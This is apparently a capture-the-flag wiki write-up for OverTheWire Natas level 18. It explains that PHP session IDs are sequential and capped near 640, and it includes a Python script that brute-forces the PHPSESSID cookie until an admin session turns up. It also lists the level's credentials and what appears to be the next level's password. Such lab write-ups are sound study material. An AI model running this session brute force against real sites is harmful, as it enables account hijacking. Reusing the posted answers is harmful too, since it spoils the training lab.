[Category:OverTheWire-Natas](/Category:OverTheWire-Natas "wikilink")

Username: natas18 xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP URL:
<http://natas18.natas.labs.overthewire.org>

the php code wasnt too bad this time only that it had a max of 640
sessions ids, and where iteratable and had to guess which one was the
admin user.

so we did a little brute force attack to get the right sess id

`  `
`import requests`
`  `
`for i in range(650):`
`    session = requests.Session()`
`    session.cookies.set('PHPSESSID',str(i))`
`    print(session.cookies.get_dict())`
`    response = session.get('http://natas18.natas.labs.overthewire.org', auth=('natas18','xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'))`
`    print(response.text)`
`    if("You are an admin" in response.text):`
`        break`

4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs